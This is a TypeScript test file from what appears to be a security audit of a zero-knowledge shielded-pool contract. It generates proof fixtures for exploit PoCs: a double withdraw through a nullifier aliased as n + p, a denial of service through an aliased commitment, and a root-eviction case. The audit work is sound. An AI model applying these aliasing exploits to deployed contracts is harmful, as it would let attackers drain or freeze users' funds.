/**
 * Generates the fixtures used by test/security/FieldCanonicality.t.sol and
 * test/security/DepositScreening.t.sol (poc_register). See test/security/generators/README.md.
 *
 * Real Groth16 proofs with DEV keys from v1-circuits/artifacts (v1-circuits 7270065); the tests
 * verify them with test/security/DevVerifier*.sol, exported from those same keys. Covers:
 *  - register, deposit, treeUpdate, honest withdraw, ALIASED withdraw (nullifier + p)
 *  - a deposit whose commitment is aliased (c + p) and the honest tree update for c
 */
import { describe, test, expect, jest } from '@jest/globals';
import { writeFileSync, mkdirSync } from 'fs';
import path from 'path';
import { parseEther, padHex, toHex } from 'viem';
import MerkleTree from 'fixed-merkle-tree';
import * as snarkJs from 'snarkjs';
import { ShieldedAccount } from '@veilnyx-sdk/account';
import { poseidonHash } from '@veilnyx-sdk/babyjubjub';
import { Note, Transaction } from '@veilnyx-sdk/transaction';
import { TransactionType } from '@veilnyx-sdk/shared-types';
import { Prover } from '../src/prover';
import { ZTransaction } from '../src/ztx';
import { hashEncryptedDataInputsSha256, hashEncryptedDataInputsPoseidon } from '../src/helpers';
import { revokerData, receiver } from './helpers/tx';
import { MockTreeSource, zeroElement } from './helpers/services';
import { getCircuitPath } from './helpers/zk';

// @ts-ignore
globalThis.snarkjs = snarkJs;

const P = 21888242871839275222246405745257275088548364400416034343698204186575808495617n;
const OUT = process.env.POC_OUT as string;
const SENDER_SEED = 1994697084159943999785488437260720072543801315335621143792968095221654743078n;
const WETH = 65537;
const CM_DEPTH = 25;
const ADDR_DEPTH = 20;
const QUEUE_SIZE = 10;
const REGISTRANT = '0x7413DABe53063Dc579A7b0D7b2E506222A5373bE';
const WITHDRAW_TO = '0x000000000000000000000000000000000000bEEF';

const hashFunction = (a: any, b: any) => padHex(toHex(poseidonHash([BigInt(a), BigInt(b)])), { size: 32 });

const initialTree = () => {
  let z = BigInt(zeroElement);
  const subtrees: bigint[] = [];
  const zeros: bigint[] = [];
  for (let i = 0; i < CM_DEPTH; i++) {
    zeros.push(z);
    subtrees.push(z);
    z = poseidonHash([z, z]);
  }
  return { subtrees, zeros, root: z, nextLeafIndex: 0, depth: CM_DEPTH };
};

const circuits = {
  transact21: getCircuitPath('transact21'),
  transact22: getCircuitPath('transact22'),
  transact23: getCircuitPath('transact23'),
  register: getCircuitPath('register'),
  treeUpdate: getCircuitPath('treeUpdate'),
};

const buildTx = (type: TransactionType, sender: any, o: any) =>
  new Transaction(
    {
      addressTreeRoot: o.addressTreeRoot,
      commitmentTreeRoot: o.commitmentTreeRoot,
      type,
      assetIds: o.assetIds,
      values: o.values,
      feeAssetId: 0,
      feeValue: 0n,
      to: type === TransactionType.WITHDRAW ? WITHDRAW_TO : sender.shieldedAddress.pack(),
    } as any,
    { chainId: 1, account: sender, notes: o.notes, revokerData } as any,
  );

const write = (name: string, hex: string) => {
  mkdirSync(OUT, { recursive: true });
  writeFileSync(path.join(OUT, `${name}.txt`), hex);
  console.log(`wrote ${name}`);
};

/// Proves `tx` but publishes nullifiers/commitments in the given RAW (possibly >= p) form.
/// alpha is computed exactly as the contract does (sha256 over raw words); beta/gamma over
/// the field-reduced values, which is what the circuit sees (witness calc reduces mod p).
const proveRaw = async (
  prover: Prover,
  tx: any,
  ctx: any,
  aliasNullifier: boolean,
  aliasCommitment: boolean,
  hashOverride?: bigint,
) => {
  const inputs: any = Prover.createTxProofInputs(tx, ctx.account, ctx.addressTree, ctx.commitmentTree);
  if (hashOverride !== undefined) inputs.hash = hashOverride;
  const redN: bigint[] = inputs.inNullifiers.map((x: bigint) => x % P);
  const redC: bigint[] = inputs.outCommitments.map((x: bigint) => x % P);
  const rawN = redN.map((x, i) => (aliasNullifier && i === 0 ? x + P : x));
  const rawC = redC.map((x, i) => (aliasCommitment && i === 0 ? x + P : x));
  const pubIds = inputs.pubAssetIds.map((n: any) => BigInt(n));
  const alpha = hashEncryptedDataInputsSha256(
    pubIds, inputs.pubValues, rawN, rawC,
    inputs.encryptedDataEncryptionKeySeed, inputs.encryptedRefundData, inputs.encryptedNoteData,
  );
  const beta = hashEncryptedDataInputsPoseidon(
    pubIds, inputs.pubValues, redN, redC,
    inputs.encryptedDataEncryptionKeySeed, inputs.encryptedRefundData, inputs.encryptedNoteData,
  );
  const all = [
    ...pubIds, ...inputs.pubValues, ...redN, ...redC,
    ...inputs.encryptedDataEncryptionKeySeed, ...inputs.encryptedRefundData,
    ...inputs.encryptedNoteData.flat(),
  ].map((x: any) => BigInt(x));
  let cp = 1n;
  let gamma = 0n;
  for (const x of all) {
    gamma = (gamma + ((x % P) * cp)) % P;
    cp = (cp * ((alpha + beta) % P)) % P;
  }
  inputs.alpha = alpha;
  inputs.beta = beta;
  inputs.gamma = gamma;
  inputs.inNullifiers = redN;
  inputs.outCommitments = redC;
  const { proof } = await prover.generateTransactionProof(inputs);
  return new ZTransaction({
    chainId: tx.chainId, type: tx.type, hash: inputs.hash, proof,
    addressTreeRoot: tx.addressTreeRoot, commitmentTreeRoot: tx.commitmentTreeRoot,
    pubAssetIds: tx.pubAssetIds, pubValues: tx.pubValues,
    nullifiers: rawN, commitments: rawC,
    feeAssetId: tx.feeAssetId, feeValue: tx.feeValue, paymaster: tx.paymaster,
    refundAddress: tx.refundAddress, target: tx.target, targetPayload: tx.targetPayload,
    memos: tx.memos, betaUHF: beta,
  } as any);
};

describe('audit poc: field aliasing', () => {
  jest.setTimeout(1800000);

  test('generate', async () => {
    const prover = new Prover({ circuits });
    const sender: any = ShieldedAccount.generate(SENDER_SEED);

    const addrTree = new MerkleTree(ADDR_DEPTH, [], { hashFunction, zeroElement });
    const cmTree = new MerkleTree(CM_DEPTH, [], { hashFunction, zeroElement });
    const addrSrc = new MockTreeSource(addrTree);
    const cmSrc = new MockTreeSource(cmTree);
    addrSrc.insert(sender.rootAddress);

    const reg = await prover.proveAddress(('0x' + '11'.repeat(65)) as any, sender, REGISTRANT as any);
    write('poc_register', reg.encode());

    // ---- deposit 100 WETH ----
    const dep = buildTx(TransactionType.DEPOSIT, sender, {
      assetIds: [WETH], values: [parseEther('100')],
      addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root, notes: [],
    });
    dep.signature = await sender.sign(dep.hash());
    const ctx0 = { account: sender, commitmentTree: cmSrc, addressTree: addrSrc };
    const depZ = await proveRaw(prover, dep, ctx0, false, false);
    write('poc_deposit', depZ.encode());

    // ---- ALIASED-COMMITMENT deposit (for the DoS PoC), built against the same roots ----
    const dep2 = buildTx(TransactionType.DEPOSIT, sender, {
      assetIds: [WETH], values: [parseEther('1')],
      addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root, notes: [],
    });
    dep2.signature = await sender.sign(dep2.hash());
    const dep2Z = await proveRaw(prover, dep2, ctx0, false, true);
    write('poc_deposit_aliased_cm', dep2Z.encode());
    // honest tree update over the REDUCED leaf for that deposit, on an empty tree
    const tuDos = await prover.proveTreeUpdate({
      lastTree: initialTree() as any,
      leaves: dep2Z.commitments.map((c: bigint) => c % P),
      queueSize: QUEUE_SIZE,
      forceUpdate: true,
    } as any);
    write('poc_tree_update_dos', tuDos.encode());

    // ---- victim deposit built against the genesis root R0 (for the root-eviction PoC) ----
    const dep3 = buildTx(TransactionType.DEPOSIT, sender, {
      assetIds: [WETH], values: [parseEther('5')],
      addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root, notes: [],
    });
    dep3.signature = await sender.sign(dep3.hash());
    write('poc_deposit_victim_r0', (await proveRaw(prover, dep3, ctx0, false, false)).encode());

    // ---- tree update inserting the honest deposit's commitments ----
    const tu = await prover.proveTreeUpdate({
      lastTree: initialTree() as any,
      leaves: depZ.commitments,
      queueSize: QUEUE_SIZE,
      forceUpdate: true,
    } as any);
    write('poc_tree_update', tu.encode());
    // no-op update (batchSize 0) over the post-update state with an empty queue
    const noop = await prover.proveTreeUpdate({
      lastTree: (tu as any).newTree,
      leaves: [],
      queueSize: QUEUE_SIZE,
      forceUpdate: true,
    } as any);
    write('poc_tree_update_noop', noop.encode());
    depZ.commitments.forEach((c: bigint) => cmSrc.insert(c));

    const idx = dep.outNotes.findIndex((n: any) => n.value === parseEther('100'));
    expect(idx).toBeGreaterThanOrEqual(0);
    const o: any = dep.outNotes[idx];
    const mk = () =>
      new Note({
        assetId: o.assetId, value: o.value, rootAddress: o.rootAddress,
        blinding: o.blinding, leafIndex: idx, revoker: o.revoker,
      });
    expect(mk().commitment).toBe(depZ.commitments[idx]);

    // ---- honest withdraw of the full 100 WETH ----
    const w1 = buildTx(TransactionType.WITHDRAW, sender, {
      assetIds: [WETH], values: [parseEther('100')],
      addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root, notes: [mk()],
    });
    w1.signature = await sender.sign(w1.hash());
    const w1Z = await proveRaw(prover, w1, { ...ctx0, commitmentTree: cmSrc }, false, false);
    write('poc_withdraw', w1Z.encode());

    // ---- aliased withdraw: same note, nullifier published as n + p ----
    const aliasNote: any = mk();
    const n = aliasNote.getNullifier(sender.viewer);
    let aliasOn = false;
    aliasNote.getNullifier = () => (aliasOn ? n + P : n);
    const w2 = buildTx(TransactionType.WITHDRAW, sender, {
      assetIds: [WETH], values: [parseEther('100')],
      addressTreeRoot: addrSrc.root, commitmentTreeRoot: cmSrc.root, notes: [aliasNote],
    });
    aliasOn = true;
    const h2 = w2.hash(); // tx hash over the RAW aliased nullifier, exactly as the contract computes it
    aliasOn = false;
    w2.signature = await sender.sign(h2);
    const w2Z = await proveRaw(prover, w2, { ...ctx0, commitmentTree: cmSrc }, true, false, h2);
    expect(w2Z.nullifiers[0]).toBe(w1Z.nullifiers[0] + P);
    write('poc_withdraw_aliased', w2Z.encode());
  });
});
